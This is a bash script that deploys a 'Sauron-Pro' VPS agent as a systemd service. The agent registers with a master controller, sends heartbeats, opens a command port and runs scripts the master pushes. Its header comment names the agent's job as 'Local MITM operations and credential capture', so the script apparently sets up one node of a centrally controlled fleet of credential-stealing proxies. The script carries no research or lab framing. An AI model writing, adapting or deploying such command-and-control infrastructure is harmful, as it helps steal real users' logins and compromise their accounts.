#!/bin/bash

#############################################################################
# Sauron-Pro VPS Agent Deployment
# 
# This script deploys a VPS agent that connects to the fleet master controller.
# Each VPS instance runs independently but reports to the master for coordination.
#
# VPS Agent Functions:
# - Register with master controller (admin.yourdomain.com)
# - Send periodic heartbeats with status updates
# - Receive and execute commands from master
# - Local MITM operations and credential capture
# - Script execution via master commands
#############################################################################

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration - CUSTOMIZE THESE VALUES
MASTER_URL="${MASTER_URL:-https://your-master-domain.com:8443}"
VPS_DOMAIN="${VPS_DOMAIN:-$(hostname).your-domain.com}"

if [[ "$MASTER_URL" == "https://your-master-domain.com:8443" ]]; then
    echo -e "${RED}❌ Please set MASTER_URL environment variable or edit this script${NC}"
    echo -e "${YELLOW}💡 Example: MASTER_URL=https://admin.yourdomain.com:8443 ./deploy-vps-agent.sh${NC}"
    exit 1
fi

SERVICE_USER="sauron"
INSTALL_DIR="/opt/sauron-pro"
CONFIG_DIR="/etc/sauron-pro"
LOG_DIR="/var/log/sauron-pro"
VPS_ID="${VPS_ID:-$(hostname)-$(date +%s)}"
VPS_LOCATION="${VPS_LOCATION:-auto-detect}"

echo -e "${BLUE}🚀 Sauron-Pro VPS Agent Deployment${NC}"
echo -e "${BLUE}==================================${NC}"
echo -e "${CYAN}🆔 VPS ID: ${VPS_ID}${NC}"
echo -e "${CYAN}🌐 VPS Domain: ${VPS_DOMAIN}${NC}"
echo -e "${CYAN}📡 Master Controller: ${MASTER_URL}${NC}"
echo -e "${CYAN}📍 Location: ${VPS_LOCATION}${NC}"
echo -e "${CYAN}📁 Install Directory: ${INSTALL_DIR}${NC}"
echo ""

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}❌ This script must be run as root (use sudo)${NC}"
   exit 1
fi

# Auto-detect location if not specified
if [[ "$VPS_LOCATION" == "auto-detect" ]]; then
    echo -e "${YELLOW}🌍 Auto-detecting VPS location...${NC}"
    # Try to get location from IP geolocation
    VPS_LOCATION=$(curl -s ipinfo.io/region 2>/dev/null || echo "Unknown")
    echo -e "${GREEN}✅ Detected location: ${VPS_LOCATION}${NC}"
fi

# Create system user
echo -e "${YELLOW}👤 Creating system user...${NC}"
if ! id "$SERVICE_USER" &>/dev/null; then
    useradd -r -s /bin/false -d "$INSTALL_DIR" "$SERVICE_USER"
    echo -e "${GREEN}✅ Created user: ${SERVICE_USER}${NC}"
else
    echo -e "${GREEN}✅ User already exists: ${SERVICE_USER}${NC}"
fi

# Create directories
echo -e "${YELLOW}📁 Creating directories...${NC}"
mkdir -p "$INSTALL_DIR"/{bin,config,logs,scripts,data}
mkdir -p "$CONFIG_DIR"
mkdir -p "$LOG_DIR"
chown -R "$SERVICE_USER:$SERVICE_USER" "$INSTALL_DIR" "$LOG_DIR"
chmod 750 "$INSTALL_DIR" "$LOG_DIR"

# Build the application
echo -e "${YELLOW}🔨 Building Sauron-Pro VPS Agent...${NC}"
if [[ ! -f "go.mod" ]]; then
    echo -e "${RED}❌ go.mod not found. Run from project root directory.${NC}"
    exit 1
fi

# Build with VPS agent tags
go build -ldflags "-X main.BuildTime=$(date -u +%Y-%m-%dT%H:%M:%SZ) -X main.Version=vps-agent-$(date +%Y%m%d)" -o "$INSTALL_DIR/bin/sauron-vps-agent" .

if [[ $? -eq 0 ]]; then
    echo -e "${GREEN}✅ Build successful${NC}"
else
    echo -e "${RED}❌ Build failed${NC}"
    exit 1
fi

# Copy configuration files
echo -e "${YELLOW}📋 Installing configuration...${NC}"
cp config/serverConfig.json "$CONFIG_DIR/serverConfig.json"
chown "$SERVICE_USER:$SERVICE_USER" "$CONFIG_DIR/serverConfig.json"
chmod 640 "$CONFIG_DIR/serverConfig.json"

# Copy all scripts
echo -e "${YELLOW}📜 Installing scripts...${NC}"
if [[ -d "scripts" ]]; then
    cp -r scripts/* "$INSTALL_DIR/scripts/"
    chmod +x "$INSTALL_DIR/scripts"/*.sh
    chown -R "$SERVICE_USER:$SERVICE_USER" "$INSTALL_DIR/scripts"
    echo -e "${GREEN}✅ Copied $(ls scripts/*.sh | wc -l) scripts${NC}"
fi

# Create VPS agent systemd service
echo -e "${YELLOW}🔧 Creating systemd service...${NC}"
cat > /etc/systemd/system/sauron-vps-agent.service << EOF
[Unit]
Description=Sauron-Pro VPS Agent
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=10
User=$SERVICE_USER
Group=$SERVICE_USER
WorkingDirectory=$INSTALL_DIR

# Environment variables for VPS agent
Environment=SAURON_MODE=vps-agent
Environment=VPS_ID=$VPS_ID
Environment=VPS_DOMAIN=$VPS_DOMAIN
Environment=VPS_LOCATION=$VPS_LOCATION
Environment=MASTER_URL=$MASTER_URL
Environment=CONFIG_DIR=$CONFIG_DIR
Environment=LOG_DIR=$LOG_DIR

# Security settings
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=$INSTALL_DIR $LOG_DIR
PrivateTmp=true

# Resource limits
LimitNOFILE=65536
MemoryMax=2G

# Executable
ExecStart=$INSTALL_DIR/bin/sauron-vps-agent
ExecReload=/bin/kill -HUP \$MAINPID

# Logging
StandardOutput=append:$LOG_DIR/vps-agent.log
StandardError=append:$LOG_DIR/vps-agent-error.log

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd and enable service
systemctl daemon-reload
systemctl enable sauron-vps-agent.service

# Create VPS agent configuration
echo -e "${YELLOW}⚙️ Creating VPS agent configuration...${NC}"
cat > "$CONFIG_DIR/vps-config.json" << EOF
{
  "vps_agent": {
    "id": "$VPS_ID",
    "domain": "$VPS_DOMAIN",
    "location": "$VPS_LOCATION",
    "master_url": "$MASTER_URL",
    "heartbeat_interval": 300,
    "command_port": 8444,
    "database": {
      "path": "$INSTALL_DIR/data/vps.db",
      "backup_interval": 7200
    },
    "security": {
      "enable_auth": true,
      "max_command_rate": 5,
      "allowed_commands": ["status", "restart", "script", "config", "update"]
    },
    "monitoring": {
      "enable_local_metrics": true,
      "report_interval": 60,
      "log_level": "info"
    }
  }
}
EOF

chown "$SERVICE_USER:$SERVICE_USER" "$CONFIG_DIR/vps-config.json"
chmod 640 "$CONFIG_DIR/vps-config.json"

# Create environment file with VPS-specific settings
echo -e "${YELLOW}🔧 Creating environment configuration...${NC}"
cat > "$CONFIG_DIR/vps.env" << EOF
# Sauron-Pro VPS Agent Environment
VPS_ID="$VPS_ID"
VPS_DOMAIN="$VPS_DOMAIN"
VPS_LOCATION="$VPS_LOCATION"
MASTER_URL="$MASTER_URL"
CONFIG_DIR="$CONFIG_DIR"
LOG_DIR="$LOG_DIR"

# Auto-detected system information
VPS_IP="$(curl -s ipinfo.io/ip 2>/dev/null || echo 'auto-detect')"
VPS_HOSTNAME="$(hostname)"
VPS_OS="$(uname -s)"
VPS_ARCH="$(uname -m)"
DEPLOY_TIME="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
EOF

chown "$SERVICE_USER:$SERVICE_USER" "$CONFIG_DIR/vps.env"
chmod 640 "$CONFIG_DIR/vps.env"

# Create VPS management scripts
echo -e "${YELLOW}🛠️ Creating VPS management utilities...${NC}"

# VPS status script
cat > "$INSTALL_DIR/bin/vps-status" << 'EOF'
#!/bin/bash
# VPS Status Utility
source /etc/sauron-pro/vps.env
echo "🆔 VPS ID: $VPS_ID"
echo "🌐 Domain: $VPS_DOMAIN"
echo "📍 Location: $VPS_LOCATION"
echo "📡 Master: $MASTER_URL"
echo "🔄 Service Status:"
systemctl status sauron-vps-agent.service --no-pager
EOF

# VPS heartbeat test script
cat > "$INSTALL_DIR/bin/vps-heartbeat" << 'EOF'
#!/bin/bash
# VPS Heartbeat Test Utility
source /etc/sauron-pro/vps.env

echo "💓 Sending heartbeat to master controller..."
curl -X POST "$MASTER_URL/fleet/register" \
  -H "Content-Type: application/json" \
  -H "X-VPS-ID: $VPS_ID" \
  -d "{
    \"ip\": \"$VPS_IP\",
    \"domain\": \"$VPS_DOMAIN\",
    \"admin_domain\": \"admin.$VPS_DOMAIN\",
    \"version\": \"vps-agent\",
    \"location\": \"$VPS_LOCATION\"
  }" | jq '.'
EOF

# VPS command receiver test
cat > "$INSTALL_DIR/bin/vps-test-command" << 'EOF'
#!/bin/bash
# VPS Command Test Utility
source /etc/sauron-pro/vps.env

echo "📡 Testing command receiver..."
curl -X POST "http://localhost:8444/vps/command" \
  -H "Content-Type: application/json" \
  -d "{
    \"vps_id\": \"$VPS_ID\",
    \"command\": \"status\",
    \"payload\": {}
  }" | jq '.'
EOF

chmod +x "$INSTALL_DIR/bin/vps-status" "$INSTALL_DIR/bin/vps-heartbeat" "$INSTALL_DIR/bin/vps-test-command"

# Create firewall rules for VPS agent
echo -e "${YELLOW}🔥 Configuring firewall...${NC}"
if command -v ufw >/dev/null 2>&1; then
    ufw allow 8444/tcp comment "Sauron VPS Command Port"
    ufw allow 22/tcp comment "SSH"
    ufw allow 80/tcp comment "HTTP"
    ufw allow 443/tcp comment "HTTPS"
    echo -e "${GREEN}✅ UFW rules configured${NC}"
elif command -v firewall-cmd >/dev/null 2>&1; then
    firewall-cmd --permanent --add-port=8444/tcp
    firewall-cmd --reload
    echo -e "${GREEN}✅ Firewalld rules configured${NC}"
fi

# Create log rotation
echo -e "${YELLOW}📋 Setting up log rotation...${NC}"
cat > /etc/logrotate.d/sauron-vps-agent << EOF
$LOG_DIR/*.log {
    daily
    rotate 14
    compress
    delaycompress
    missingok
    notifempty
    sharedscripts
    postrotate
        systemctl reload sauron-vps-agent || true
    endscript
}
EOF

# Set executable permissions
chown "$SERVICE_USER:$SERVICE_USER" "$INSTALL_DIR/bin/sauron-vps-agent"
chmod 755 "$INSTALL_DIR/bin/sauron-vps-agent"

# Test connection to master controller
echo -e "${YELLOW}📡 Testing connection to master controller...${NC}"
if curl -s --connect-timeout 10 "$MASTER_URL/fleet/instances" >/dev/null 2>&1; then
    echo -e "${GREEN}✅ Master controller reachable${NC}"
else
    echo -e "${YELLOW}⚠️ Master controller not reachable (may be normal if not deployed yet)${NC}"
fi

# Start the service
echo -e "${YELLOW}🚀 Starting Sauron VPS Agent...${NC}"
systemctl start sauron-vps-agent.service

# Wait a moment for startup
sleep 3

# Check service status
if systemctl is-active --quiet sauron-vps-agent.service; then
    echo -e "${GREEN}✅ Sauron VPS Agent started successfully${NC}"
    echo ""
    echo -e "${PURPLE}📊 VPS Agent Information:${NC}"
    echo -e "${CYAN}🆔 VPS ID: ${VPS_ID}${NC}"
    echo -e "${CYAN}🌐 Domain: ${VPS_DOMAIN}${NC}"
    echo -e "${CYAN}📍 Location: ${VPS_LOCATION}${NC}"
    echo -e "${CYAN}📡 Master Controller: ${MASTER_URL}${NC}"
    echo -e "${CYAN}📁 Install Directory: ${INSTALL_DIR}${NC}"
    echo -e "${CYAN}📋 Config Directory: ${CONFIG_DIR}${NC}"
    echo -e "${CYAN}📝 Log Directory: ${LOG_DIR}${NC}"
    echo ""
    echo -e "${PURPLE}🛠️ VPS Management Commands:${NC}"
    echo -e "${CYAN}   ${INSTALL_DIR}/bin/vps-status         - Show VPS status${NC}"
    echo -e "${CYAN}   ${INSTALL_DIR}/bin/vps-heartbeat      - Test heartbeat to master${NC}"
    echo -e "${CYAN}   ${INSTALL_DIR}/bin/vps-test-command   - Test command receiver${NC}"
    echo -e "${CYAN}   systemctl status sauron-vps-agent     - Check service status${NC}"
    echo -e "${CYAN}   journalctl -u sauron-vps-agent -f     - View live logs${NC}"
    echo ""
    echo -e "${PURPLE}📝 Environment Configuration:${NC}"
    echo -e "${CYAN}   Configuration: ${CONFIG_DIR}/vps.env${NC}"
    echo -e "${CYAN}   VPS Config: ${CONFIG_DIR}/vps-config.json${NC}"
    echo ""
    echo -e "${GREEN}🎯 VPS Agent deployment complete!${NC}"
    echo -e "${YELLOW}💡 This VPS will automatically register with the master controller${NC}"
    echo -e "${YELLOW}💡 Monitor heartbeat status in master controller fleet dashboard${NC}"
    
    # Attempt initial registration
    echo ""
    echo -e "${YELLOW}📡 Attempting initial registration with master...${NC}"
    sleep 2
    "$INSTALL_DIR/bin/vps-heartbeat" 2>/dev/null || echo -e "${YELLOW}⚠️ Initial registration will retry automatically${NC}"
    
else
    echo -e "${RED}❌ Failed to start Sauron VPS Agent${NC}"
    echo -e "${YELLOW}📋 Check logs: journalctl -u sauron-vps-agent.service${NC}"
    exit 1
fi
